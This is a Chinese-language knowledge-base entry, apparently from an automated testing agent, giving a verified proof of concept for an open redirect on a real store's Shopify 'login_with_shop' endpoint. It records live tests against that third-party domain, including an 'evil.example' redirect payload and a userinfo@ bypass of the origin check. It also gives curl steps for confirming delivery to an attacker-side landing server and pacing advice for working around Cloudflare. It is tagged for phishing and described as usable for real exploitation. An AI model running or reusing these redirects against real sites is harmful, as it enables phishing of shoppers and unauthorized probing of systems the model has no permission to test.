# Shopify login_with_shop/buyer/complete 开放重定向——端到端交付证明法 + 无 OAuth 参数外带（负向）

- **code**: shopify-login_with_shop-open-redirect-e2e-delivery-proof
- **kind**: poc
- **category**: auth-bypass
- **component**: Shopify 商店 (Login with Shop /services/login_with_shop/buyer/complete)
- **severity**: medium
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 14:09-14:11 UTC 本机 curl 8.5.0 经平台记录代理实测 goffsgames.co.uk：①return_to=https://evil.example/pwn → HTTP/2 302 location 同值；缺省→400。②起本地落地服务(127.0.0.1:18080)后 curl -L 跟随 return_to=http://127.0.0.1:18080/landing → 落地服务日志 HIT path=/landing host=127.0.0.1:18080（受害者真实投递到验证者端）。③userinfo@ 变体 return_to=http://goffsgames.co.uk%40127.0.0.1:18080/pwn → 302 location: http://goffsgames.co.uk@127.0.0.1:18080/pwn 且 curl -L 实际落到 host=127.0.0.1:18080（HIT path=/pwn），证明同源前缀校验可被 userinfo@ 绕过。④附 state=SECRETSTATE123&code=CODEABC 或 buyer_flags=TEST → 仍 302 到纯 return_to，附加参数被忽略（无 OAuth code/state 外带）。事实#373。
- **tags**: open-redirect,shopify,login_with_shop,e2e-delivery,userinfo-bypass,negative,phishing
- **created_at**: 2026-11-11T14:12:40.962Z
- **engine**: goffsgames.co.uk

## 描述

对 kb#512 的补充：#512 只证明了“能 302 跳”；本条目补充两点可用于实际利用的实证——(A) 端到端交付证明法：起本地/公网落地服务记录命中，用 curl -L 跟随 302，日志出现受害请求即证明真实投递（userinfo@ 变体同样可用，落地主机=验证者侧）；(B) 负向情报：该端点仅回显 return_to，state/code/buyer_flags 等附加参数被忽略，不存在 OAuth code/state 外带面，别在该端点上花时间找授权码泄露。

## 用法

```
A) 端到端交付证明（把“能跳”升级为“真实投递到验证者端”）：
  1. 验证者侧起落地记录服务，绑端口并记录命中（示例：python http.server 记 GET path/host 到日志）。
  2. curl -sk -L -i "https://<shopify-host>/services/login_with_shop/buyer/complete?return_to=http://<验证者host:port>/landing"
  3. 判据：目标返回 302 location=<验证者URL>，且验证者日志出现 HIT path=/landing、host=<验证者host> → 受害者真实到达验证者页。
  4. userinfo@ 绕过同时验证：return_to=http://<受信域>%40<验证者host:port>/pwn → 302 location 原样回显，curl -L 落地 host=<验证者host>。
B) 负向：不要用 state=/code= 尝试 OAuth 参数外带——该端点忽略它们，永远只跳纯 return_to。
注意：Cloudflare 前置，单线程、请求间≥3s；本机系统代理下 302 直接可见（无需跟随后续跳转）。
```
